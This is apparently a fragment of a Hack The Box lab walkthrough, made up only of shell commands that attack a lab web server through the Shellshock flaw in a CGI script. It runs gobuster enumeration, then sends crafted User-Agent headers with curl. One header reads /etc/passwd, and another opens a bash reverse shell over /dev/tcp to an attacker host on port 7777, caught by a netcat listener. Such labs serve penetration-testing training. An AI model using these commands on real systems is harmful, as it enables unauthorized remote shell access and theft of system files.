...
```shell-session
swmpdnky@htb[/htb]$ gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
...
```shell-session
swmpdnky@htb[/htb]$ curl -i http://10.129.204.231/cgi-bin/access.cgi
...
```shell-session
swmpdnky@htb[/htb]$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
...
```shell-session
swmpdnky@htb[/htb]$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```
...
```shell-session
swmpdnky@htb[/htb]$ sudo nc -lvnp 7777
